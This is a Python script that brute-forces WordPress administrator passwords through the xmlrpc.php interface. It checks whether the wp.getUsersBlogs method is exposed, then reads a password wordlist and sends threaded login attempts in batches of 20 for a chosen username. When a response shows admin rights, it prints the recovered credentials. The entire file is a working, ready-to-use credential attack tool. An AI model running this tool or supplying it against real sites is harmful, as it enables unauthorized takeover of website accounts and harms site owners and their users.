#!/usr/bin/python3

from time import sleep
from termcolor import colored, cprint
import sys
import xml.etree.ElementTree as ET
import threading
import requests
from html import escape as esc
import datetime as dt


class bcolors:
    HEADER = '\033[95m'
    OKBLUE = '\033[94m'
    OKGREEN = '\033[92m'
    WARNING = '\033[93m'
    FAIL = '\033[91m'
    ENDC = '\033[0m'
    BOLD = '\033[1m'
    UNDERLINE = '\033[4m'
    CBLINK = '\033[5m'
    CYELLOW = '\033[33m'


stop_threads = False
st = dt.datetime.now().replace(microsecond=0)


def verify(url):  # verify if target is vulnerable or not

    xmlrpc_methods = "<?xml version=\"1.0\"?><methodCall><methodName>system.listMethods</methodName><params></params></methodCall>"
    # input sys.argv for url in main()

    headers = {"Content-Type": "application/xml"}
    r = requests.post(url, data=xmlrpc_methods, headers=headers)
    r.encoding = 'UTF-8'
    if "wp.getUsersBlogs" in r.text:
        print(colored('[>]', 'green'), colored(
            'Target is vulnerable.', 'white'))
    else:
        print(bcolors.CYELLOW +
              "Target is NOT vulnerable for Brute Forcing." + bcolors.ENDC)
        print("wp.GetUsersBlogs is not enabled.")
        print("Please report any incorrect results on GitHuB or DM on Twitter.")
        sys.exit(0)


def admin(data):
    root = ET.fromstring(data)
    struct_nodes = root.findall(".//struct")
    for struct_node in struct_nodes:
        for members_node in struct_node:
            for member_node in members_node:
                if member_node.text and "isAdmin" in member_node.text:
                    return True

    return False


def bruteforcing(url, user, password):
    global stop_threads
    global st
    data = f'<methodCall><methodName>wp.getUsersBlogs</methodName><params><param><value>{user}</value></param><param><value>{esc(password)}</value></param></params></methodCall>'
    headers = {"Content-Type": "application/xml"}
    r = requests.post(url, data=data, headers=headers)
    r.encoding = 'UTF-8'
    if admin(r.text):
        stop_threads = True
        cprint(
            f"\n\n{13 * '-'}  BRUTEFORCE SUCCESSFULL  {13 * '-'}", attrs=['bold'])
        cprint("\n--=[User found]=--", 'green', attrs=['blink'])
        print(colored("Login:    " + user, 'cyan'))
        print(colored("Password: " + esc(password), 'cyan'))
        print(bcolors.WARNING +
              f"[*] Tooks {dt.datetime.now().replace(microsecond=0) - st}" + bcolors.ENDC)
        print(bcolors.OKGREEN +
              "--=[Exiting...]=--" + bcolors.ENDC)
        print("")
        sleep(2)
        sys.exit(0)
    if stop_threads:
        sleep(2)
        sys.exit(0)


def main(argv):
    if len(argv) < 3:
        print(bcolors.WARNING +
              "\nUsage: python3 xmlrpcBruteforce.py http://wordpress.org/xmlrpc.php passwords.txt username" + bcolors.ENDC)
        print(bcolors.WARNING + "Try adding 'www' if nothing works.\n" + bcolors.ENDC)
        sys.exit(0)

    url = argv[1]
    wordlist = argv[2]
    user = argv[3]
    print("")
    print(15 * '-' + "Examining Target" + 20 * '-')
    print("")
    verify(url)

    print("")

    print(bcolors.WARNING + "--=[Target: " + bcolors.ENDC +
          url + bcolors.WARNING + "]=--" + bcolors.ENDC)
    print("")

    passwords = []
    iterations = 1
    count = 0

    print(colored(f"        \t[...Bruteforcing...]\n", 'cyan'))
    st = dt.datetime.now().replace(microsecond=0)
    with open(wordlist, encoding="ISO-8859-1") as f:
        for line in f:
            if stop_threads:
                sys.exit(0)
            passwords.append(line.rstrip())
            if count == 20:
                for password in passwords:
                    threading.Thread(target=bruteforcing, args=(
                        url, user, password)).start()
                sleep(1)
                print(bcolors.FAIL + "\t    --=[Tried: " + str(
                    iterations * 20) + " passwords]=--" + bcolors.ENDC, end='\r')
                del passwords[:]
                iterations += 1
                count = 0
            count += 1

    if passwords:
        for password in passwords:
            if stop_threads:
                sys.exit(0)
            threading.Thread(target=bruteforcing, args=(
                url, user, password)).start()
    sleep(2)
    ft = dt.datetime.now().replace(microsecond=0) - st
    if not stop_threads:
        print(bcolors.FAIL + "\t--=[Failed]=--" + bcolors.ENDC)


main(sys.argv)
